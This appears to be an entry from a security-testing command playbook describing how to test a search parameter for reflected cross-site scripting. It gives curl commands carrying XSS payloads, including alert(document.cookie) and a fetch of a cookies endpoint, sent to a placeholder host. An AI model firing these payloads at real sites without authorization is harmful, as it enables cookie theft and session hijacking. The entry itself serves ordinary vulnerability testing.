---
data: >-
  curl -G "https://navy-site.example.com/search" --data-urlencode
  "q=<script>alert(document.cookie)</script>"
tags:
  - xss
  - web-test
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.269Z'
id: 8bf6c11a-d641-4ba5-8822-371e699384fe
verified: false
validated: true
submitted: true
---
# curl-fetch-xss-payload

## Command

```bash
curl -G "https://navy-site.example.com/search" --data-urlencode "q=<script>alert(document.cookie)</script>"
```

## Description

This command uses curl to send a GET request to a target URL with a URL-encoded XSS payload in the 'q' parameter, simulating a reflected XSS test. It retrieves the response to check if the payload is reflected unescaped in the HTML, indicating vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | Treats the following arguments as GET parameters | Yes |
| `--data-urlencode` | URL-encodes the data (e.g., the payload) | Yes |
| `q=<script>alert(document.cookie)</script>` | The vulnerable parameter and XSS payload | Yes |

## Examples

### Basic Usage

```bash
curl -G "https://navy-site.example.com/search" --data-urlencode "q=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -G "https://navy-site.example.com/search" --data-urlencode "q=<script>fetch('/api/cookies').then(r=>r.text()).then(d=>console.log(d))</script>" -v
```

## Expected Output

The command outputs the raw HTML response from the server. Look for the unescaped payload (e.g., `<script>alert(document.cookie)</script>`) in the body, confirming reflection. No execution occurs in curl; use a browser for that. Successful vulnerability shows the script tag intact.

## Related

- [[Related Procedure: Inject-Malicious-Script-via-Reflected-XSS-in-URL-Parameter]]
